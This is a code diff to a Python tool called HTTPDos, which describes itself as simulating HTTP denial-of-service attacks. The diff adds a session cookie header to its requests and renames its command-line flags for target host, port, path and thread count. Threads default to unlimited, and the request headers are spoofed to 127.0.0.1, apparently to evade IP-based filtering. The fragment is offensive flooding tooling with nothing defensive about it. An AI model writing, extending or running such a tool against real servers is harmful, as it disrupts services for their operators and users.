@@ -78,6 +78,10 @@ class HTTPDos:
             "X-Remote-Addr: 127.0.0.1\r\n",
             "X-Remote-IP: 127.0.0.1\r\n",
         ]
+        
+        if self.cookie:
+            headers.append(f"Cookie: {self.cookie}\r\n")
+        
         headers.append("\r\n")
         return ''.join(headers)
 
@@ -158,15 +162,13 @@ class HTTPDos:
                 thread.join()
         print("[!] All threads have been stopped.")
 
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="HTTPDos: A tool for simulating HTTP Denial of Service attacks.")
-    parser.add_argument("-H", "--hostname", required=True, help="Target Host")
-    parser.add_argument("-P", "--port", type=int, required=True, help="Target Port")
-    parser.add_argument("-t", "--threads", type=int, default=sys.maxsize, help="Maximum number of concurrent threads (default: unlimited)")
-    parser.add_argument("-p", "--path", help="Target Path (Optional)")
-    parser.add_argument("-c", "--cookies", help="Session Cookie (Optional)")
-
+    parser.add_argument("-host", required=True, help="Target Host")
+    parser.add_argument("-port", type=int, required=True, help="Target Port")
+    parser.add_argument("-path", help="Target Path (Optional)")
+    parser.add_argument("-threads", type=int, default=sys.maxsize, help="Maximum number of concurrent threads (default: unlimited)")
+    parser.add_argument("-cookie", help="Session Cookie (Optional)")
 
     args = parser.parse_args()
     HTTPDos(args)
